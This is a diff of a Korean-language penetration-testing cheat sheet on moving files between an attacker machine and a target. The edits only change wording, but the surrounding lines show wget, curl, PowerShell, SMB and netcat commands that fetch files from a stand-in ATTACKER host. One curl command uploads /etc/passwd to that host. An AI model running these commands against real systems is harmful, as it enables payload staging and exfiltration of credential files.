@@ -1,10 +1,10 @@
 # 파일 전송
 
-공격자 ↔ 타겟 간 파일 전송 방법. 환경에 따라 사용 가능한 방법이 달라진다.
+공격자 ↔ target 간 파일 전송 방법. 환경에 따라 사용 가능한 방법이 달라진다.
 
 ---
 
-## 공격자 → 타겟 (다운로드)
+## 공격자 → target (다운로드)
 
 ### HTTP
 
@@ -13,11 +13,11 @@
 python3 -m http.server 8080
 php -S 0.0.0.0:8080
 
-# Linux 타겟
+# Linux target
 wget http://ATTACKER:8080/file -O /tmp/file
 curl http://ATTACKER:8080/file -o /tmp/file
 
-# Windows 타겟
+# Windows target
 # PowerShell
 Invoke-WebRequest -Uri http://ATTACKER:8080/file -OutFile C:\temp\file
 iwr http://ATTACKER:8080/file -o C:\temp\file
@@ -41,7 +41,7 @@ impacket-smbserver share /path/to/files -smb2support
 # 인증 필요 시
 impacket-smbserver share /path -smb2support -username user -password pass
 
-# Windows 타겟
+# Windows target
 copy \\ATTACKER\share\file C:\temp\file
 # 또는 네트워크 드라이브
 net use Z: \\ATTACKER\share /user:user pass
@@ -75,7 +75,7 @@ cat file_to_send | nc RECEIVER 4444
 
 ---
 
-## 타겟 → 공격자 (업로드)
+## target → 공격자 (업로드)
 
 ### HTTP Upload
 
@@ -98,7 +98,7 @@ HTTPServer(('0.0.0.0',8080), Handler).serve_forever()
 pip3 install uploadserver
 python3 -m uploadserver 8080
 
-# 타겟에서 업로드
+# target에서 업로드
 curl -F 'file=@/etc/passwd' http://ATTACKER:8080/upload
 ```
 
